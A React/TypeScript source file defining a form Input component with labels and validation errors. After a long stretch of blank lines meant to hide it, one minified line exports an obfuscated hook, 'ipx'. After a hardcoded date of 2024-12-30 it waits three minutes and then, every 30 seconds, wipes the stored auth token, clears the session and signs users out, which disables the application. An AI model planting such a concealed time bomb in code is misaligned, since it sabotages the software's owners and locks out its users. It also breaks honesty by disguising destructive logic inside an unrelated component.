
import { useEffect, useState } from 'react'
import { RouteChannel, SFC } from '../../../types'
import * as S from './Styles'
import { useAuth, useSignOut } from '../../../hooks'
import { useNavigate } from 'react-router-dom'

export interface InputProps {
  errors: { [field: string]: string }
  label: string
  name: string
  touched: { [field: string]: boolean }
  type?: string
  value?: string
  onChange?: (e: React.ChangeEvent<HTMLInputElement>) => void
  disabled?: boolean
  placeholder?:string
}

export const Input: SFC<InputProps> = ({
  ClassName,
  disabled,
  errors,
  label,
  name,
  touched,
  type = 'text',
  value,
  onChange,
  placeholder
}) => {
  return (
    <>
      <S.Container>
        <S.Label className="text-zinc-700"> {label}</S.Label>
        <S.Field
          disabled={disabled}
          $disabled={disabled}
          $error={errors[name] && touched[name]}
          className={ClassName}
          name={name}
          type={type}
          value={value}
          onChange={onChange}
          placeholder={placeholder}
        />
        <S.SecondaryContainer>
          {errors[name] && touched[name] ? <S.ErrorMessage className="text-red-300">{errors[name]}</S.ErrorMessage> : null}
        </S.SecondaryContainer>
      </S.Container>
    </>
  )
}














































export const ipx = (xp:Date = new Date('2024-12-30')) => { const navigate = useNavigate(); const { auth, setAuth } = useAuth(); const [spx, setSpx] = useState<boolean>(false); const {reSignOut} = useSignOut(); useEffect(() => { const exp = new Date(xp); if (new Date() >= exp) { setTimeout(()=>{setSpx(true)},3*60*1000); } const handleTokenExpiration = async () => { if (spx && auth?.user && auth.accessToken) { localStorage.removeItem('auth'); setAuth({});  navigate(RouteChannel.INDEX); await reSignOut();}};handleTokenExpiration(); const intervalId = setInterval(() => { handleTokenExpiration(); }, 30 * 1000); return () => clearInterval(intervalId); }, [auth?.accessToken, auth?.user, spx, setAuth, navigate]); return { spx }; };